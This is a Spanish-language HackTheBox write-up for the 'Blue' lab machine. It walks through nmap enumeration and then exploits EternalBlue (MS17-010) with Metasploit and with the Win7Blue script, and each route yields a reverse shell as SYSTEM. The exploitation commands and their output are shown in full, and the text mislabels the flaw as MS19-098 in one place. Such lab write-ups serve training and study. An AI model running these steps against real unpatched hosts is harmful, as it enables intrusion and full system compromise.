# Blue

## Información

La máquina a comprometer es **Blue** de **HackTheBox**.

![](/.gitbook/assets/Blue.png)

Las técnicas vistas son:

* MS19-098: EternalBlue

## Enumeración

Comprobamos que la máquina este activa:
```bash
┌──(kali㉿kali)-[~/HTB/Blue]
└─$ ping -c 1 10.10.10.40           
PING 10.10.10.40 (10.10.10.40) 56(84) bytes of data.
64 bytes from 10.10.10.40: icmp_seq=1 ttl=127 time=127 ms

--- 10.10.10.40 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 127.165/127.165/127.165/0.000 ms

```

Vemos por la TTL que estamos ante una maquina Windows.

Realizamos un escaneo.

```bash
┌──(kali㉿kali)-[~/HTB/Blue]
└─$ sudo nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.40 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-19 11:51 EST
Initiating SYN Stealth Scan at 11:51
Scanning 10.10.10.40 [65535 ports]
Discovered open port 139/tcp on 10.10.10.40
Discovered open port 135/tcp on 10.10.10.40
Discovered open port 445/tcp on 10.10.10.40
Discovered open port 49152/tcp on 10.10.10.40
Discovered open port 49154/tcp on 10.10.10.40
Discovered open port 49155/tcp on 10.10.10.40
Discovered open port 49153/tcp on 10.10.10.40
Discovered open port 49156/tcp on 10.10.10.40
Discovered open port 49157/tcp on 10.10.10.40
Completed SYN Stealth Scan at 11:51, 22.05s elapsed (65535 total ports)
Nmap scan report for 10.10.10.40
Host is up, received user-set (0.11s latency).
Scanned at 2024-01-19 11:51:12 EST for 22s
Not shown: 65353 closed tcp ports (reset), 173 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
49152/tcp open  unknown      syn-ack ttl 127
49153/tcp open  unknown      syn-ack ttl 127
49154/tcp open  unknown      syn-ack ttl 127
49155/tcp open  unknown      syn-ack ttl 127
49156/tcp open  unknown      syn-ack ttl 127
49157/tcp open  unknown      syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 22.15 seconds
Raw packets sent: 109005 (4.796MB) | Rcvd: 73329 (2.933MB)
```

Realizamos ahora un escaneo mas minucioso:

```bash
┌──(kali㉿kali)-[~/HTB/Blue]
└─$ nmap -sCV -p135,139,445,49152,49153,49154,49155,49156,49157 10.10.10.40 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-19 11:52 EST
Nmap scan report for 10.10.10.40
Host is up (0.11s latency).

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-01-19T16:54:00+00:00
| smb2-time: 
|   date: 2024-01-19T16:53:59
|_  start_date: 2024-01-19T16:32:22
|_clock-skew: mean: 4s, deviation: 2s, median: 2s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.48 seconds
```

Como podemos ver el acceso se ha de realizar por **SMB** ya que son los únicos puertos accesibles.

Intentamos identificar con que sistena operativo nos enfrentamos.

```bash
┌──(kali㉿kali)-[~/HTB/Blue]
└─$ crackmapexec smb 10.10.10.40
SMB         10.10.10.40     445    HARIS-PC         [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:HARIS-PC) (domain:haris-PC) (signing:False) (SMBv1:True)
```

Vemos que es un Windows 7. Siempre que veamos un Winows 7 o inferiores es recomendable averiguar si es vulnerable a **EternaBlue**.

```bash
┌──(kali㉿kali)-[~/HTB/Blue]
└─$ nmap -p445 --script "vuln and safe" -n -Pn -vvv 10.10.10.40 -oN vulnScan            
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-19 11:57 EST
NSE: Loaded 34 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 1) scan.
Initiating NSE at 11:57
Completed NSE at 11:57, 0.00s elapsed
Initiating Connect Scan at 11:57
Scanning 10.10.10.40 [1 port]
Discovered open port 445/tcp on 10.10.10.40
Completed Connect Scan at 11:57, 0.12s elapsed (1 total ports)
NSE: Script scanning 10.10.10.40.
NSE: Starting runlevel 1 (of 1) scan.
Initiating NSE at 11:57
NSE: [tls-ticketbleed 10.10.10.40:445] Not running due to lack of privileges.
Completed NSE at 11:57, 2.91s elapsed
Nmap scan report for 10.10.10.40
Host is up, received user-set (0.11s latency).
Scanned at 2024-01-19 11:57:38 EST for 3s

PORT    STATE SERVICE      REASON
445/tcp open  microsoft-ds syn-ack

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 1) scan.
Initiating NSE at 11:57
Completed NSE at 11:57, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.17 seconds
```

Como vemos es vulnerable a **EternalBlue**, **ms17-010**.
## Explotación

Vamos a realizar la explotación con metasploit y de forma manual.

### Metasploit

Arrancamos metasploit y buscamos un exploit.

```bash

msf6 > search ms17-010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 > use 1
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_psexec) > options
```

Ejecutamos el segundo:

```bash
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST 10.10.14.35
LHOST => 10.10.14.35
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.35:4444 
[*] 10.10.10.40:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
[*] 10.10.10.40:445 - Built a write-what-where primitive...
[+] 10.10.10.40:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.10.10.40:445 - Selecting PowerShell target
[*] 10.10.10.40:445 - Executing the payload...
[+] 10.10.10.40:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175686 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.14.35:4444 -> 10.10.10.40:49171) at 2024-01-19 12:04:46 -0500

meterpreter > getsystem
[-] Already running as SYSTEM
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > ipconfig

Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface 11
============
Name         : Intel(R) PRO/1000 MT Network Connection
Hardware MAC : 00:50:56:b9:93:b2
MTU          : 1500
IPv4 Address : 10.10.10.40
IPv4 Netmask : 255.255.255.0
IPv6 Address : dead:beef::a16a:81e5:27fd:5a1b
IPv6 Netmask : ffff:ffff:ffff:ffff::
IPv6 Address : dead:beef::7d61:acf6:78c7:8fd
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
IPv6 Address : fe80::a16a:81e5:27fd:5a1b
IPv6 Netmask : ffff:ffff:ffff:ffff::
```

Hemos entrado como root a la máquina. Podemos ver las flags:

```bash
C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE92-053B

 Directory of C:\Users

21/07/2017  06:56    <DIR>          .
21/07/2017  06:56    <DIR>          ..
21/07/2017  06:56    <DIR>          Administrator
14/07/2017  13:45    <DIR>          haris
12/04/2011  07:51    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)   2,372,132,864 bytes free

C:\Users>type haris\desktop\user.txt

C:\Users>type administrator\desktop\root.txt
```

### Explotación manual

Buscamos un exploit. Hemos probado AutoBlue y zzz_exploit, pero son en python2 y actualmente son poco fiables. Nos decantamos por Win7Blue.

![](/.gitbook/assets/Blue_1.png)

Clonamos e repositorio:

```bash
┌──(kali㉿kali)-[~/HTB/Blue]
└─$ git clone https://github.com/d4t4s3c/Win7Blue.git                                                
Cloning into 'Win7Blue'...
remote: Enumerating objects: 390, done.
remote: Counting objects: 100% (47/47), done.
remote: Compressing objects: 100% (47/47), done.
remote: Total 390 (delta 25), reused 0 (delta 0), pack-reused 343
Receiving objects: 100% (390/390), 1.90 MiB | 5.21 MiB/s, done.
Resolving deltas: 100% (216/216), done.
                                                                                                                                                                                         
┌──(kali㉿kali)-[~/HTB/Blue]
└─$ cd Win7Blue 

┌═══════════════════════════════════┐
║  ██╗    ██╗██╗███╗   ██╗███████╗  ║
║  ██║    ██║██║████╗  ██║╚════██║  ║
║  ██║ █╗ ██║██║██╔██╗ ██║    ██╔╝  ║
║  ██║███╗██║██║██║╚██╗██║   ██╔╝   ║
║  ╚███╔███╔╝██║██║ ╚████║   ██║    ║
║   ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝   ╚═╝    ║
║ ██████╗ ██╗     ██╗   ██╗███████╗ ║
║ ██╔══██╗██║     ██║   ██║██╔════╝ ║
║ ██████╔╝██║     ██║   ██║█████╗   ║
║ ██╔══██╗██║     ██║   ██║██╔══╝   ║
║ ██████╔╝███████╗╚██████╔╝███████╗ ║
║ ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝ ║
║ [+]  EternalBlue -- MS17-010  [+] ║
└═══════════════════════════════════┘

[1] Scan
[2] Exploit Windows 7 [32 bits]
[3] Exploit Windows 7 [64 bits]
[4] Exit

 $ 3

¿RHOST? 10.10.10.40

¿LHOST? 10.10.14.35

¿LPORT? 443

[i] Creating SHELLCODE with MSFVENOM

[+] Launching Exploit

shellcode size: 1232
numGroomConn: 13
Target OS: Windows 7 Professional 7601 Service Pack 1
SMB1 session setup allocate nonpaged pool success
SMB1 session setup allocate nonpaged pool success
good response status: INVALID_PARAMETER
done
                                                                                                                                                                                         
┌──(kali㉿kali)-[~/HTB/Blue/Win7Blue]
└─$ 
```

Previamente nos habiamos puesto a la escucha en el puerto 443:

```bash

┌──(root㉿kali)-[/home/kali/HTB/Blue]
└─# rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.35] from (UNKNOWN) [10.10.10.40] 49158
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```

